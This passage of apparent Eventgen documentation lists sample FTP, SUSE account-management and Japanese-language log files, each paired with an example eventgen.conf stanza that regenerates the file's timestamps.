## Replace timestamp 21:01:13
token.0.token = \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %I:%M:%S
```

#### III. Microsoft FTPD Sample 3 logs
```
17:57:59 192.168.3.64 Administrator MSFTPSVC1 HAIJO2 192.168.1.12 21 [144]USER Administrator - 331 0 0 0 0 FTP - - - -
17:57:59 192.168.3.64 Administrator MSFTPSVC1 HAIJO2 192.168.1.12 21 [144]PASS - - 230 0 0 0 16 FTP - - - -
17:58:11 192.168.3.64 Administrator MSFTPSVC1 HAIJO2 192.168.1.12 21 [144]sent /wwwroot/winkel/weekrapport.asp - 226 0 0 0 0 FTP - - - -
17:58:11 192.168.3.64 Administrator MSFTPSVC1 HAIJO2 192.168.1.12 21 [144]sent /wwwroot/winkel/weekrapport.asp - 226 0 0 0 0 FTP - - - -
17:58:11 192.168.3.64 Administrator MSFTPSVC1 HAIJO2 192.168.1.12 21 [144]sent /wwwroot/winkel/weekrapport.asp - 226 0 14903 0 250 FTP - - - -
17:58:32 192.168.3.64 Administrator MSFTPSVC1 HAIJO2 192.168.1.12 21 [144]created weekrapport.asp - 226 0 0 14874 610 FTP - - - -
17:58:42 192.168.3.64 Administrator MSFTPSVC1 HAIJO2 192.168.1.12 21 [144]sent /wwwroot/develop/weekrapport.asp - 226 0 0 0 0 FTP - - - -
17:58:42 192.168.3.64 Administrator MSFTPSVC1 HAIJO2 192.168.1.12 21 [144]sent /wwwroot/develop/weekrapport.asp - 226 0 0 0 0 FTP - - - -
17:58:42 192.168.3.64 Administrator MSFTPSVC1 HAIJO2 192.168.1.12 21 [144]sent /wwwroot/develop/weekrapport.asp - 226 0 14903 0 547 FTP - - - -
17:58:49 192.168.3.64 Administrator MSFTPSVC1 HAIJO2 192.168.1.12 21 [144]created weekrapport.asp - 226 0 0 14874 594 FTP - - - -
17:58:57 192.168.3.64 Administrator MSFTPSVC1 HAIJO2 192.168.1.12 21 [144]QUIT - - 250 0 0 0 0 FTP - - - -
```

Sample file name: **microsoftftpd_3.sample**

Example eventgen.conf:
```
[microsoftftpd_3.sample]
interval = 15
earliest = -15s
latest = now
count = 100
outputMode = file
fileName = Temp/microsoftftpd3_sample.log
## Replace timestamp 21:01:13
token.0.token = \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %H:%M:%S
```

#### IV. Microsoft FTPD Sample 4 logs
```
2004-12-30 11:24:41 203.115.228.178 ftp MSFTPSVC1 MULTIMEDIA 192.168.0.203 21 [12]USER ftp - 331 0 FTP - - - -
2004-12-30 11:24:41 203.115.228.178 - MSFTPSVC1 MULTIMEDIA 192.168.0.203 21 [12]PASS ftp@ftp.net - 530 1326 FTP - -
2004-12-30 11:24:43 203.115.228.178 anyone MSFTPSVC1 MULTIMEDIA 192.168.0.203 21 [13]USER anyone - 331 0 FTP - - - -
2004-12-30 11:24:43 203.115.228.178 - MSFTPSVC1 MULTIMEDIA 192.168.0.203 21 [13]PASS - - 530 1326 FTP - - - -
2004-12-30 11:24:44 203.115.228.178 root MSFTPSVC1 MULTIMEDIA 192.168.0.203 21 [14]USER root - 331 0 FTP - - - -
2004-12-30 11:24:44 203.115.228.178 admin MSFTPSVC1 MULTIMEDIA 192.168.0.203 21 [15]USER admin - 331 0 FTP - - - -
2004-12-30 11:24:44 203.115.228.178 - MSFTPSVC1 MULTIMEDIA 192.168.0.203 21 [14]PASS - - 530 1326 FTP - - - -
2004-12-30 11:24:44 203.115.228.178 webmaster MSFTPSVC1 MULTIMEDIA 192.168.0.203 21 [16]USER webmaster - 331 0 FTP
```

Sample file name: **microsoftftpd_4.sample**

Example eventgen.conf:
```
[microsoftftpd_4.sample]
interval = 15
earliest = -15s
latest = now
count = 100
outputMode = file
fileName = Temp/microsoftftpd4_sample.log
## Replace timestamp 2004-12-30 11:24:41
token.0.token = \d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %Y-%m-%d %H:%M:%S
```

#### V. Microsoft FTPD Sample 5 logs
```
13:15:45 172.28.129.116 [51]USER xxxxx 331 0
13:15:46 172.28.129.116 [51]PASS - 230 0
13:15:56 172.28.129.116 [51]MKD 20051103 257 0
13:15:57 172.28.129.116 [51]CWD 20051103 250 0
13:17:19 172.28.129.116 [51]created /filename 226 0
13:18:44 172.28.129.116 [51]QUIT - 226 0
13:39:13 160.164.22.7 [52]USER anonymous 331 0
13:39:13 160.164.22.7 [52]PASS opss 530 1326
13:39:13 160.164.22.7 [52]QUIT - 530 0
```

Sample file name: **microsoftftpd_5.sample**

Example eventgen.conf:
```
[microsoftftpd_5.sample]
interval = 15
earliest = -15s
latest = now
count = 100
outputMode = file
fileName = Temp/microsoftftpd5_sample.log
## Replace timestamp 13:15:45
token.0.token = \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %H:%M:%S
```

#### VI. ProFTPD logs
```
Jul 14 04:44:46 opala proftpd[30812] opala.xxxxxx.edu.br (sieapp.ufpel.edu.br[200.17.161.73]): mod_delay/0.5: delaying for 14871 usecs
Jul 14 04:44:46 opala proftpd[30813] opala.xxxxxx.edu.br (sieapp.ufpel.edu.br[200.17.161.73]): no such user 'guest'
Jul 14 04:44:46 opala proftpd[30813] opala.xxxxxx.edu.br (sieapp.ufpel.edu.br[200.17.161.73]): USER guest: no such user found from sieapp.ufpel.edu.br [200.17.161.73] to 192.168.2.5:21
Jul 14 04:44:46 opala proftpd[30813] opala.xxxxxx.edu.br (sieapp.ufpel.edu.br[200.17.161.73]): mod_delay/0.5: delaying for 86 usecs
Jul 14 04:44:46 opala proftpd[30815] opala.xxxxxx.edu.br (sieapp.ufpel.edu.br[200.17.161.73]): FTP session opened.
Jul 14 04:44:46 opala proftpd[30814] opala.xxxxxx.edu.br (sieapp.ufpel.edu.br[200.17.161.73]): no such user 'guest'
Jul 14 04:44:46 opala proftpd[30814] opala.xxxxxx.edu.br (sieapp.ufpel.edu.br[200.17.161.73]): USER guest: no such user found from sieapp.ufpel.edu.br [200.17.161.73] to 192.168.2.5:21
Jul 14 04:44:46 opala proftpd[30813] opala.xxxxxx.edu.br (sieapp.ufpel.edu.br[200.17.161.73]): FTP session closed.
Jul 14 04:44:46 opala proftpd[30812] opala.xxxxxx.edu.br (sieapp.ufpel.edu.br[200.17.161.73]): FTP session closed.
Jul 14 04:44:46 opala proftpd[30815] opala.xxxxxx.edu.br (sieapp.ufpel.edu.br[200.17.161.73]): mod_delay/0.5: delaying for 33 usecs
Jul 14 04:44:46 opala proftpd[30814] opala.xxxxxx.edu.br (sieapp.ufpel.edu.br[200.17.161.73]): FTP session closed.
Jul 14 04:44:47 opala proftpd[30816] opala.xxxxxx.edu.br (sieapp.ufpel.edu.br[200.17.161.73]): FTP session opened.
```

Sample file name: **proftpd.sample**

Example eventgen.conf:
```
[proftpd.sample]
interval = 15
earliest = -15s
latest = now
count = 100
outputMode = file
fileName = Temp/proftpd_sample.log
## Replace timestamp Jul 14 04:44:46
token.0.token = \w{3}\s+\d{1,2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %H:%M:%S
```

#### VII. PureFTPD logs
```
pure-ftpd: (?@24.79.92.194) [WARNING] Authentication failed for user [Administrator]
pure-ftpd: (?@24.79.92.194) [WARNING] Authentication failed for user [Administrator]
pure-ftpd: (?@24.79.92.194) [WARNING] Authentication failed for user [Administrator]
pure-ftpd: (?@24.79.92.194) [WARNING] Authentication failed for user [Administrator]
pure-ftpd: (?@24.79.92.194) [WARNING] Authentication failed for user [Administrator]
pure-ftpd: (?@24.79.92.194) [WARNING] Authentication failed for user [Administrator]
pure-ftpd: (?@24.79.92.194) [WARNING] Authentication failed for user [Administrator]
```

Sample file name: **pureftpd.sample**

Example eventgen.conf:
```
[pureftpd.sample]
interval = 15
earliest = -15s
latest = now
count = 100
outputMode = file
fileName = Temp/pureftpd_sample.log
## No timestamp
```

#### VIII. Solaris/HP-UX FTPD logs
```
Jun 20 09:00:42 File-Server ftpd[65613]: Failed authentication from: [U2FsdGVkX18af1PrJ6KSUhskC8ikccfvTqyjjJI/qtk=] @ 58.211.16.202 [58.211.16.202]
Jun 20 09:00:52 File-Server ftpd[65625]: Failed authentication from: [U2FsdGVkX1+RbLXPa7lV2Ly9a3Bir9x88RdjF2oWkg4=] @ 58.211.16.202 [58.211.16.202]
Jun 20 09:01:02 File-Server ftpd[65639]: Failed authentication from:  [U2FsdGVkX18V16WdD4Z7rcx6tv0zBiUG6bok2Y3IQGQ=] @ 58.211.16.202 [58.211.16.202]
Jun 25 10:24:06 File-Server ftpd[29807]: Failed authentication from: 1.Red-88-2-137.staticIP.rima-tde.net [88.2.137.1]
Jun 25 10:24:25 File-Server ftpd[29871]: Failed authentication from:   1.Red-88-2-137.staticIP.rima-tde.net [88.2.137.1]
Jul  4 02:11:44 File-Server ftpd[54844]: FTP LOGIN REFUSED (PASS  before USER) FROM 202.113.244.42 [202.113.244.42]
```

Sample file name: **solarishpuxftpd.sample**

Example eventgen.conf:
```
[solarishpuxftpd.sample]
interval = 60
earliest = -60s
latest = now
count = 1000
outputMode = file
fileName = Temp/solarishpuxftpd_sample.log
## Replace timestamp Nov 17 21:41:22
token.0.token = \w{3}\s+\d{1,2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %H:%M:%S
```

#### IX. VSFTPD logs
```
Mon Jul 10 15:51:17 2006 [pid 26152] CONNECT: Client "192.168.2.10"
Mon Aug 21 14:33:24 2006 [pid 20175] [dcid] FAIL LOGIN: Client "127.0.0.1"
Mon Aug 21 14:37:23 2006 [pid 20293] [dcid] OK LOGIN: Client "127.0.0.1"
Mon Aug 21 14:32:06 2006 [pid 20127] [ftp] OK LOGIN: Client "127.0.0.1", anon password "lala@"
Sun Aug 27 16:28:20 2006 [pid 13962] [xx] OK UPLOAD: Client "1.2.3.4", "/a.php", 8338 bytes, 18.77Kbyte/sec
```

Sample file name: **vsftpd.sample**

Example eventgen.conf:
```
[vsftpd.sample]
interval = 60
earliest = -60s
latest = now
count = 1000
outputMode = file
fileName = Temp/vsftpd_sample.log
## Replace timestamp Mon Jul 10 15:51:17 2006
token.0.token = \w{3}\s+\w{3}\s+\d{2}\s+\d{2}:\d{2}:\d{2}\s+\d{4}
token.0.replacementType = timestamp
token.0.replacement = %a %b %d %I:%M:%S %Y
```

#### X. VSFTPD logs
```
Mon Jul 10 15:51:17 2006 [pid 26152] CONNECT: Client "192.168.2.10"
Mon Aug 21 14:33:24 2006 [pid 20175] [dcid] FAIL LOGIN: Client "127.0.0.1"
Mon Aug 21 14:37:23 2006 [pid 20293] [dcid] OK LOGIN: Client "127.0.0.1"
Mon Aug 21 14:32:06 2006 [pid 20127] [ftp] OK LOGIN: Client "127.0.0.1", anon password "lala@"
Sun Aug 27 16:28:20 2006 [pid 13962] [xx] OK UPLOAD: Client "1.2.3.4", "/a.php", 8338 bytes, 18.77Kbyte/sec
```

Sample file name: **vsftpd.sample**

Example eventgen.conf:
```
[vsftpd.sample]
interval = 60
earliest = -60s
latest = now
count = 1000
outputMode = file
fileName = Temp/vsftpd_sample.log
## Replace timestamp Mon Jul 10 15:51:17 2006
token.0.token = \w{3}\s+\w{3}\s+\d{2}\s+\d{2}:\d{2}:\d{2}\s+\d{4}
token.0.replacementType = timestamp
token.0.replacement = %a %b %d %I:%M:%S %Y
```

#### XI. XFERLOG logs
```
Thu Sep  2 09:52:00 2004 50 192.168.20.10 896242 /home/test/file1.tgz b _ o r suporte ftp 0 * c
Thu Sep  2 09:57:16 2004 289 192.168.20.10 8045867 /home/test2.tgz b _ o r suporte ftp 0 * c
```

Sample file name: **xferlog.sample**

Example eventgen.conf:
```
[xferlog.sample]
interval = 60
earliest = -60s
latest = now
count = 1000
outputMode = file
fileName = Temp/xferlog_sample.log
## Replace timestamp Thu Sep  2 09:52:00 2004
token.0.token = \w{3}\s+\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}\s+\d{4}
token.0.replacementType = timestamp
token.0.replacement = %a %b %d %I:%M:%S %Y
```

## SJIS Log (Japanese Log)
```
2016-06-08 09:36:10.597  TEST6222222  11111413  AA0000B0010  00  0  L  日本国民たる要件は、法律でこれを定める＝11111111413    
2016-06-08 09:37:07.060  TEST6222222  11111413  BB0010F0010  00  0  5  国民は、すべての基本的人権の享有を妨げられない    
2016-06-08 09:37:58.407  TEST6222222  11111413  BB0010F0010  00  0  4  すべて国民は　K:\テストケース  AAAAA1010_2016110608_093713(挙70-13)20160311.txt    
2016-06-08 09:38:04.273  TEST6222222  11111413  AA0000B0020  00  0  F       
2016-06-08 12:54:36.463  TEST1111111  altest02  AA0000B0010  00  0  L  法の下に平等であつて＝altest02 
```

Sample file name: **sjis.sample** (Japanese OS Only)

Example eventgen.conf:
```
[sjis.sample]
interval = 15
earliest = -15s
latest = now
count = 100
outputMode = file
fileName = Temp/sjis.log
token.0.token = \d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}\.\d{3,6}
token.0.replacementType = timestamp
token.0.replacement = %Y-%m-%d %H:%M:%S.000
```

## Suse Linux Logs
#### I. Useradd logs
```
Sep 15 17:11:27 myserver useradd[13542]: new account added - account=fred, uid=1016, gid=100, home=/home/fred, shell=/bin/bash, by=0
Sep 15 17:11:27 myserver useradd[13542]: account added to group - account=fred, group=video, gid=33, by=0
Sep 15 17:11:27 myserver useradd[13542]: account added to group - account=fred, group=dialout, gid=16, by=0
Sep 15 17:11:27 myserver useradd[13542]: home directory created - account=fred, uid=1016, home=/home/fred, by=0
Sep 15 17:11:27 myserver useradd[13542]: running USERADD_CMD command - script=/usr/sbin/useradd.local, account=fred, uid=1016, gid=100, home=/home/fred, by=0
```

Sample file name: **suse_useradd.sample**

Example eventgen.conf:
```
[suse_useradd.sample]
interval = 15
earliest = -15s
latest = now
count = 100
outputMode = file
fileName = Temp/suse_useradd.log
## Replace timestamp Sep 15 17:11:27
token.0.token = \w{3}\s+\d{2}\s+\d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %I:%M:%S
```

#### II. Userdel logs
```
Sep 15 16:37:13 myserver userdel[12584]: running USERDEL_PRECMD command - script=/usr/sbin/userdel-pre.local, account=mary, uid=1014, gid=100, home=/home/mary, by=0
Sep 15 16:37:13 myserver crontab[12586]: (root) DELETE (mary)
Sep 15 16:37:13 myserver userdel[12584]: account removed from group - account=mary, group=video, gid=33, by=0
Sep 15 16:37:13 myserver userdel[12584]: account removed from group - account=mary, group=dialout, gid=16, by=0
Sep 15 16:37:13 myserver userdel[12584]: account deleted - account=mary, uid=1014, by=0
Sep 15 16:37:13 myserver userdel[12584]: running USERDEL_POSTCMD command - script=/usr/sbin/userdel-post.local, account=mary, uid=1014, gid=100, home=/home/mary, by=0
```
Sample file name: **suse_userdel.sample**

Example eventgen.conf:
```
[suse_userdel.sample]
interval = 15
earliest = -15s
latest = now
count = 100
outputMode = file
fileName = Temp/suse_userdel.log
## Replace timestamp Sep 15 16:37:13
token.0.token = \w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %I:%M:%S
```

#### III. Useradd & passwd fail logs
```
May 28 16:04:10 server2 useradd[30245]: failed adding user 'avahi', data deleted
May 28 16:04:10 server2 passwd[30246]: password for 'avahi' changed by 'root'
May 28 16:04:12 server2 passwd[30263]: password for 'hal' changed by 'root'
May 28 16:07:10 server2 useradd[30523]: failed adding user 'mysql', data deleted
May 28 16:11:48 server2 passwd[32532]: password for 'gdm' changed by 'root'
May 28 16:16:07 server2 useradd[633]: failed adding user 'privoxy', data deleted
```
Sample file name: **suse_pwdfail.sample**

Example eventgen.conf:
```
[suse_pwdfail.sample]
interval = 15
earliest = -15s
latest = now
count = 100
outputMode = file
fileName = Temp/suse_pwdfail.log
## Replace timestamp May 28 16:16:07
token.0.token = \w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %I:%M:%S
```


## CSV Japanese Log
```
"2016/07/01 07:26:06","CN=YYY III/O=HBHK","POST/差込についてユーザがファイルをダウンロードしました。ユーザがファイルをダウンロードしました。 /b11111111.nsf/($Drafts)/$new/?EditDocument&Form=h_PageUI&PresetFields=s_NotesForm;Reply HTTP/1.1"
"2016/07/01 07:35:06","CN=YYY III/O=HBHK","POST/差込についてユーザがファイルをダウンロードしました。ユーザがファイルをダウンロードしました。 /b22222222.nsf/($Drafts)/$new/?EditDocument&Form=h_PageUI&PresetFields=s_NotesForm;Reply HTTP/1.1"
"2016/07/01 07:51:06","CN=YYY III/O=HBHK","POST/差込についてユーザがファイルをダウンロードしました。ユーザがファイルをダウンロードしました。 /b33333333.nsf/($Drafts)/$new/?EditDocument&Form=h_PageUI&PresetFields=s_NotesForm;Reply HTTP/1.1"
"2016/07/01 07:57:06","CN=RRR III/O=HBHK","POST/差込についてユーザがファイルをダウンロードしました。ユーザがファイルをダウンロードしました。 /b44444444.nsf/($Drafts)/$new/?EditDocument&Form=h_PageUI&PresetFields=s_NotesForm;Reply HTTP/1.1"
"2016/07/01 07:58:06","CN=TTT III/O=HBHK","POST/差込についてユーザがファイルをダウンロードしました。ユーザがファイルをダウンロードしました。 /b55555555.nsf/($Drafts)/$new/?EditDocument&Form=h_PageUI&PresetFields=s_NotesForm;Reply HTTP/1.1"
"2016/07/01 07:58:41","CN=YYY III/O=HBHK","POST/差込についてユーザがファイルをダウンロードしました。ユーザがファイルをダウンロードしました。 /b66666666.nsf/($Drafts)/$new/?EditDocument&Form=h_PageUI&PresetFields=s_NotesForm;Reply HTTP/1.1"
"2016/07/01 07:58:59","CN=YYY III/O=HBHK","POST/差込についてユーザがファイルをダウンロードしました。ユーザがファイルをダウンロードしました。 /b77777777.nsf/($Drafts)/$new/?EditDocument&Form=h_PageUI&PresetFields=s_NotesForm;Reply HTTP/1.1"
"2016/07/01 19:36:06","CN=YYY III/O=HBHK","POST/差込についてユーザがファイルをダウンロードしました。ユーザがファイルをダウンロードしました。 /b88888888.nsf/($Drafts)/$new/?EditDocument&Form=h_PageUI&PresetFields=s_NotesForm;Reply HTTP/1.1"
"2016/07/01 19:40:06","CN=TTT III/O=HBHK","POST/差込についてユーザがファイルをダウンロードしました。ユーザがファイルをダウンロードしました。 /b99999999.nsf/($Drafts)/$new/?EditDocument&Form=h_PageUI&PresetFields=s_NotesForm;Reply HTTP/1.1"
"2016/07/01 19:47:06","CN=KKK III/O=HBHK","POST/差込についてユーザがファイルをダウンロードしました。ユーザがファイルをダウンロードしました。 /b00000000.nsf/($Drafts)/$new/?EditDocument&Form=h_PageUI&PresetFields=s_NotesForm;Reply HTTP/1.1"
```

Sample file name: **japanese_csv1.sample**

Example eventgen.conf:
```
[japanese_csv1.sample]
interval = 15
earliest = -15s
latest = now
count = 100
outputMode = file
fileName = Temp/test1.csv
token.0.token = \d{4}/\d{2}/\d{2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %Y/%m/%d %H:%M:%S
```
